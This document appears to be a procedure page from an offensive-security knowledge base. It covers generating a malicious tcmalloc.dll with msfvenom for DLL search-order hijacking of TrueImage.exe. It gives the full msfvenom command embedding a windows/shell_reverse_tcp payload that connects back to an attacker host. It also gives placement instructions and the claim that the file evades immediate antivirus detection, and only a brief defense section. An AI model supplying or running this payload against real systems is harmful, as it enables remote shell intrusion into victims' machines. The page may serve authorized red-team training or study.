---
id: proc-msfvenom-dll-001
tags:
  - payload-generation
  - dll
  - reverse-shell
type: procedure
tools:
  - '[[tools/msfvenom]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/msfvenom-generate-dll-payload]]'
verified: false
platforms:
  - Linux
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Dynamic-link Library Injection]]'
updated_at: '2025-12-14T17:29:19.659Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Dynamic-link Library Injection]]'
---
# Generate-Malicious-DLL-with-msfvenom

## Summary

This procedure generates a malicious DLL payload using msfvenom on a Kali Linux attacker machine, embedding a reverse TCP shell that executes when loaded by a vulnerable Windows process like TrueImage.exe.

## Description

msfvenom creates custom Metasploit payloads in DLL format. Here, we use the windows/shell_reverse_tcp payload to establish a reverse connection to the attacker upon DLL load. The DLL is named tcmalloc.dll to match the hijacked library. Prerequisites: Metasploit Framework installed on Kali, knowledge of attacker IP/port. Expected outcome: A portable DLL file ready for deployment to C:\Python27.

## Requirements

1. Kali Linux with Metasploit installed
2. Attacker IP and port accessible from target
3. Target vulnerability confirmed (DLL search order)

## Defense

Defensive measures and detection strategies:

- Scan for unsigned or anomalous DLLs in PATH directories
- Enable Protected Process Light (PPL) for sensitive apps
- Monitor network connections from unexpected processes (e.g., TrueImage.exe to external IPs)

## Objectives

1. Create a DLL that mimics tcmalloc.dll with malicious code
2. Ensure payload triggers on load without crashing the host process
3. Establish reverse shell for post-exploitation

## Instructions

### Step 1: Prepare msfvenom Command

**Context**: Select payload and output format for Windows DLL.

Use windows/shell_reverse_tcp for a basic reverse shell.

### Step 2: Execute Payload Generation

**Context**: Generate the DLL with specified LHOST and LPORT.

**Command** ([[commands/msfvenom-generate-dll-payload]]):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > tcmalloc.dll
```

> Replace placeholders; expected output: Progress messages and DLL file creation. No errors indicate success.

### Step 3: Verify Payload

**Context**: Confirm the DLL is valid and contains payload.

Transfer to Windows and check file properties or use tools like PEiD to verify it's a DLL.

> Expected: ~50-100KB file, loads without immediate AV detection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Dynamic-link Library Injection]]

### Sub-Techniques


## Commands Used

- [[commands/msfvenom-generate-dll-payload]]

## Tools Used

- [[tools/msfvenom]]

## Tags

- payload
- msfvenom
- shellcode
